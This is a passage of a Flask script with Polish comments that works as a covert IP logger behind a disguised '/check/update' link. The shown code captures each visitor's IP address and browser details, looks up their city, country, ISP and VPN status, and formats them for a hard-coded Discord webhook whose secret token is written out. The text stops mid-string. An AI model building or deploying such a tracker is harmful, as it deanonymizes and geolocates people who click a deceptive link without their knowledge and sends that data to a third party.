from flask import Flask, request, redirect
import requests
import os

app = Flask(__name__)

# Twoje dane z Discorda (Webhook wklejony na stałe)
WEBHOOK_URL = "https://discord.com/api/webhooks/1473637575519371297/nHzhezuIyOO09wdySY_0bhmClxQos8bojQ-65JHFHUzummLY5gsrTWqJINrUK_siJvLp"

@app.route('/check/update')
def logger():
    # Pobieranie adresu IP (obsługa nagłówków serwera proxy Koyeb)
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()

    # Pobieranie danych o przeglądarce i systemie operacyjnym
    ua = request.headers.get('User-Agent')

    # Pobieranie szczegółowej lokalizacji przez darmowe API
    city = "Nieznane"
    country = "Nieznany"
    isp = "Nieznany"
    vpn_status = "Nie"
    
    try:
        # Fields: status, miasto, kraj, dostawca, proxy (VPN)
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,city,isp,proxy")
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                city = data.get('city', 'Nieznane')
                country = data.get('country', 'Nieznany')
                isp = data.get('isp', 'Nieznany')
                vpn_status = "Tak" if data.get('proxy') else "Nie"
    except Exception as e:
        print(f"Błąd podczas pobierania lokalizacji: {e}")

    # Budowanie estetycznej wiadomości (Embed) dla Discorda
    embed = {
        "title": "🎯 Nowy użytkownik wszedł w link!",
        "color": 15158332, # Kolor czerwony
        "fields": [
            {"name": "🌐 Adres IP", "value": f"`{ip}`", "inline": True},
            {"name": "📍 Lokalizacja", "value": f"{city}, {country}", "inline": True},
            {"name": "🏢 Dostawca Internetu", "value": f"`{isp}`", "inline": False},
            {"name": "🛡️ Czy wykryto VPN/Proxy?", "value": vpn_status, "inline": True},
            {"name": "📱 Dane urządzenia", "value": f"

